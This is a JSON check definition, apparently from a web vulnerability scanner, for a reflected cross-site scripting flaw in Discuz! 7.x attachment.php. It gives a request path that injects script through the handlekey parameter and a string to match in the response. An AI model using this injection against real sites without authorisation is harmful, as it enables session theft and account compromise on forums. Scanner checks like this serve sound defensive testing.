{
    "target":"discuz",
    "meta":{
        "name":    "Discuz! 7.x attachment.php XSS",
        "remarks": "Discuz! 7.x attachment.php 存在反射型XSS漏洞",
        "level":   3,
        "type":    "XSS",
        "author":   "wolf",
        "references": {
            "url":"",
            "cve":"",
            "kpid":"KP-0046"
        }
    },
    "request":{
        "path":     "/attachment.php?infloat=yes&handlekey=123);test(700);//",
        "postData": ""
    },
    "verify":{
        "type":  "string",
        "match": "messagehandle_123);test(700);//"
    }
}